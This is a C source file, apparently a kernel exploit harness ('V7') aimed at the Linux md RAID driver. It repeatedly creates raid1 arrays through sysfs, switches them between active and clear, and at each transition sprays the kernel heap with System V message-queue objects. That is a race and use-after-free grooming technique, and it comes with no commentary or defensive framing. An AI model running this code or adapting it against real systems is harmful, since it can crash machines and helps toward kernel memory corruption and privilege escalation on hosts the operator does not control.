#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sched.h>

static int wr(const char *p, const char *v, int *er)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0) { if (er) *er = errno; return -1; }
    ssize_t n = write(fd, v, strlen(v));
    int e = errno;
    close(fd);
    if (er) *er = e;
    return n < 0 ? -1 : 0;
}

struct spray_arg {
    int qid, count, size;
    volatile int *go, *done;
};

static void *spray_thread(void *a)
{
    struct spray_arg *sa = (struct spray_arg *)a;
    int sz = sa->size;
    char *msg = malloc(sz + 64);
    if (!msg) return NULL;
    for (;;) {
        while (!*sa->go) {
            if (*sa->done) { free(msg); return NULL; }
            sched_yield();
        }
        for (int i = 0; i < sa->count; i++) {
            *(long *)msg = 0;
            memset(msg + 8, 0, sz);
            if (msgsnd(sa->qid, msg, sz, IPC_NOWAIT) < 0)
                break;
        }
        *sa->go = 0;
        *sa->done = 1;
    }
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 60;
    int sz = argc > 2 ? atoi(argv[2]) : 960;

    printf("V7 uid=%d rounds=%d msgsz=%d\n", getuid(), rounds, sz);
    fflush(stdout);

    int qid = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
    if (qid < 0) { printf("msgget %d\n", errno); return 1; }

    volatile int go = 0, done = 0;
    struct spray_arg sa = { qid, 2000, sz, &go, &done };
    pthread_t th;
    pthread_create(&th, NULL, spray_thread, &sa);

    int ok_c = 0, ok_a = 0, ok_cl = 0;

    for (int i = 0; i < rounds; i++) {
        char name[32], p[192];
        snprintf(name, sizeof(name), "md%d", i);

        int e = 0;
        if (wr("/sys/module/md_mod/parameters/new_array", name, &e) < 0) {
            printf("r=%d NEWARR e=%d\n", i, e);
            continue;
        }
        ok_c++;

        snprintf(p, sizeof(p), "/sys/block/%s/md/metadata_version", name);
        wr(p, "none", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/level", name);
        wr(p, "raid1", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/raid_disks", name);
        wr(p, "1", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/new_dev", name);
        if (wr(p, "1:0", &e) < 0) printf("r=%d BIND e=%d\n", i, e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/slot", name);
        wr(p, "0", &e);
        snprintf(p, sizeof(p), "/sys/block/%s/md/dev-ram0/state", name);
        wr(p, "in_sync", &e);

        done = 0;
        go = 1;

        snprintf(p, sizeof(p), "/sys/block/%s/md/array_state", name);
        e = 0;
        if (wr(p, "active", &e) == 0) ok_a++;
        else if (i < 2) printf("r=%d ACTIVE e=%d\n", i, e);

        e = 0;
        if (wr(p, "clear", &e) == 0) ok_cl++;
        else if (i < 2) printf("r=%d CLEAR e=%d\n", i, e);

        for (int w = 0; w < 300 && !done; w++) usleep(500);
        go = 0;

        char tmp[8192];
        while (msgrcv(qid, tmp, sizeof(tmp), 0, IPC_NOWAIT | MSG_NOERROR) >= 0)
            ;

        if ((i % 10) == 0) {
            printf("r=%d c=%d a=%d cl=%d\n", i, ok_c, ok_a, ok_cl);
            fflush(stdout);
        }
    }

    done = 1; go = 1;
    printf("V7FINAL create=%d active=%d clear=%d\n", ok_c, ok_a, ok_cl);
    printf("V7 done\n");
    fflush(stdout);
    return 0;
}